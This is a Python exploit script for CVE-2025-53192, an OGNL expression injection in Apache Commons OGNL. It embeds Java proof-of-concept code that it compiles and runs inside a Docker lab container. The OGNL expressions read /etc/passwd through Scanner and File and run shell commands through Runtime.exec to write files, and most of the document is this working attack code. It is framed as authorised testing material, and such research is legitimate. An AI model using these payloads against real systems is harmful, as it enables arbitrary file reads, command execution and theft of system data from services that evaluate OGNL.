#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Commons OGNL — Expression Injection to File I/O
# CVE            : CVE-2025-53192
# Vendor         : Apache Software Foundation
# Product        : Apache Commons OGNL
# Affected       : All versions (project retired, no fix)
# Type           : CWE-146 - Expression/Command Delimiter Injection
# CVSS           : 8.8 (HIGH)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-53192 — Vector 4: File I/O (Read + Write) via OGNL

Sub-vector A: Arbitrary file READ via Scanner+File (no shell process needed).
Sub-vector B: Arbitrary file WRITE + verify via OGNL.

PREREQUISITES:
  - Python 3 (stdlib only)
  - Docker container 'cve-2025-53192-vulnerable' running

REFERENCES:
  - CVE-2025-53192
  - https://github.com/advisories/GHSA-5vgh-76mj-8hcq
"""

import subprocess
import sys
import textwrap

RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

DEFAULT_CONTAINER = "cve-2025-53192-vulnerable"
CLASSPATH = "/lab:/lab/commons-ognl.jar:/lab/javassist.jar"

JAVA_POC_SOURCE = textwrap.dedent(r'''
    import org.apache.commons.ognl.Ognl;
    import org.apache.commons.ognl.OgnlContext;
    import org.apache.commons.ognl.DefaultClassResolver;
    import org.apache.commons.ognl.DefaultTypeConverter;
    import org.apache.commons.ognl.DefaultMemberAccess;
    import java.io.BufferedReader;
    import java.io.InputStreamReader;

    /**
     * CVE-2025-53192 Vector 4 — File I/O without shell execution
     *
     * Sub-vector A: Read /etc/passwd using java.util.Scanner + java.io.File
     *   → ASTCtor("java.io.File", "/etc/passwd") → File object
     *   → ASTCtor("java.util.Scanner", File) → Scanner wrapping the file
     *   → ASTMethod: .useDelimiter("\\A").next() → read entire file
     *
     * Sub-vector B: Write proof file, then read it back
     *   → Uses Runtime.exec() to write file
     *   → Then reads it back with Scanner to verify
     */
    public class PoCVector4 {
        public static void main(String[] args) throws Exception {
            DefaultMemberAccess memberAccess = new DefaultMemberAccess(false);
            OgnlContext context = new OgnlContext(
                new DefaultClassResolver(),
                new DefaultTypeConverter(),
                memberAccess
            );
            context.setRoot(new Object());

            // === Sub-vector A: Arbitrary file read (no shell needed) ===
            System.out.println("SUBVECTOR: A - File Read");
            String readExpr = "new java.util.Scanner(new java.io.File(\"/etc/passwd\")).useDelimiter(\"\\\\A\").next()";
            System.out.println("OGNL_EXPR: " + readExpr);

            try {
                Object tree = Ognl.parseExpression(readExpr);
                Object result = Ognl.getValue(tree, context, context.getRoot());
                String fileContent = result.toString();

                // Show first 5 lines
                String[] lines = fileContent.split("\n");
                System.out.println("FILE_READ_START");
                for (int i = 0; i < Math.min(5, lines.length); i++) {
                    System.out.println(lines[i]);
                }
                if (lines.length > 5) {
                    System.out.println("... (" + (lines.length - 5) + " more lines)");
                }
                System.out.println("FILE_READ_END");
                System.out.println("FILE_READ_STATUS: SUCCESS");
            } catch (Exception e) {
                System.out.println("FILE_READ_STATUS: FAILED - " + e.getMessage());
            }

            System.out.println("---");

            // === Sub-vector B: Write + verify ===
            System.out.println("SUBVECTOR: B - File Write + Verify");
            String marker = "CVE-2025-53192-FILE-IO-VECTOR";
            String writeExpr = "@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{\"sh\",\"-c\",\"echo " + marker + " > /tmp/ognl-file-io-poc\"})";
            System.out.println("OGNL_EXPR_WRITE: " + writeExpr);

            try {
                Object tree = Ognl.parseExpression(writeExpr);
                Object result = Ognl.getValue(tree, context, context.getRoot());
                Process proc = (Process) result;
                proc.waitFor();

                // Read back the written file via OGNL (not shell)
                String verifyExpr = "new java.util.Scanner(new java.io.File(\"/tmp/ognl-file-io-poc\")).useDelimiter(\"\\\\A\").next()";
                Object vTree = Ognl.parseExpression(verifyExpr);
                Object vResult = Ognl.getValue(vTree, context, context.getRoot());
                String written = vResult.toString().trim();

                System.out.println("FILE_WRITTEN: " + written);
                if (written.equals(marker)) {
                    System.out.println("FILE_WRITE_STATUS: SUCCESS");
                } else {
                    System.out.println("FILE_WRITE_STATUS: MISMATCH - expected '" + marker + "' got '" + written + "'");
                }
            } catch (Exception e) {
                System.out.println("FILE_WRITE_STATUS: FAILED - " + e.getMessage());
            }

            System.out.println("---");
            System.out.println("STATUS: SUCCESS");
        }
    }
''').strip()


def run_docker_exec(container, cmd, timeout=30):
    full_cmd = ["docker", "exec", container] + cmd
    try:
        result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"


def copy_to_container(container, content, dest_path):
    full_cmd = ["docker", "exec", "-i", container, "sh", "-c", f"cat > {dest_path}"]
    try:
        result = subprocess.run(full_cmd, input=content, capture_output=True, text=True, timeout=10)
        return result.returncode == 0
    except Exception:
        return False


def exploit(container):
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}  CVE-2025-53192 Vector 4: File I/O via OGNL (no shell for reads){RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print()
    print(f"  {YELLOW}Sub-vector A:{RESET} Read /etc/passwd via Scanner+File (pure Java I/O)")
    print(f"  {YELLOW}Sub-vector B:{RESET} Write proof marker file + verify via OGNL")
    print()

    # Deploy, compile, run
    print(f"  [1/3] Deploying exploit...", end=" ")
    if not copy_to_container(container, JAVA_POC_SOURCE, "/lab/PoCVector4.java"):
        print(f"{RED}FAILED{RESET}")
        return False
    print(f"{GREEN}OK{RESET}")

    print(f"  [2/3] Compiling...", end=" ")
    rc, _, stderr = run_docker_exec(container, ["javac", "-cp", CLASSPATH, "/lab/PoCVector4.java"])
    if rc != 0:
        print(f"{RED}FAILED{RESET}\n  {stderr}")
        return False
    print(f"{GREEN}OK{RESET}")

    print(f"  [3/3] Executing file I/O exploits...", end=" ")
    rc, stdout, stderr = run_docker_exec(container, ["java", "-cp", CLASSPATH, "PoCVector4"])

    if "STATUS: SUCCESS" not in stdout:
        print(f"{RED}FAILED{RESET}")
        print(f"  stdout: {stdout}")
        return False
    print(f"{GREEN}OK{RESET}")
    print()

    # Parse Sub-vector A results
    file_content = ""
    in_file = False
    for line in stdout.splitlines():
        if line.strip() == "FILE_READ_START":
            in_file = True
            continue
        if line.strip() == "FILE_READ_END":
            in_file = False
            continue
        if in_file:
            file_content += line + "\n"

    read_ok = "FILE_READ_STATUS: SUCCESS" in stdout
    write_ok = "FILE_WRITE_STATUS: SUCCESS" in stdout

    print(f"  {CYAN}[Sub-vector A] Arbitrary File Read (/etc/passwd):{RESET}")
    if read_ok and file_content.strip():
        print(f"  {RED}┌──────────────────────────────────────────────{RESET}")
        for line in file_content.strip().splitlines():
            print(f"  {RED}│ {line}{RESET}")
        print(f"  {RED}└──────────────────────────────────────────────{RESET}")
        print(f"  {GREEN}✓ Arbitrary file read confirmed (no shell process needed){RESET}")
    else:
        print(f"  {RED}✗ File read failed{RESET}")
    print()

    print(f"  {CYAN}[Sub-vector B] Arbitrary File Write + Verify:{RESET}")
    for line in stdout.splitlines():
        if line.startswith("FILE_WRITTEN:"):
            written = line[len("FILE_WRITTEN:"):].strip()
            print(f"  Written content: {RED}{written}{RESET}")
    if write_ok:
        print(f"  {GREEN}✓ Arbitrary file write confirmed{RESET}")
    else:
        print(f"  {RED}✗ File write failed{RESET}")

    overall = read_ok and write_ok
    print()
    if overall:
        print(f"  {GREEN}✓ CVE-2025-53192 File I/O impact confirmed{RESET}")
    return overall


if __name__ == "__main__":
    container = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_CONTAINER
    success = exploit(container)
    sys.exit(0 if success else 1)
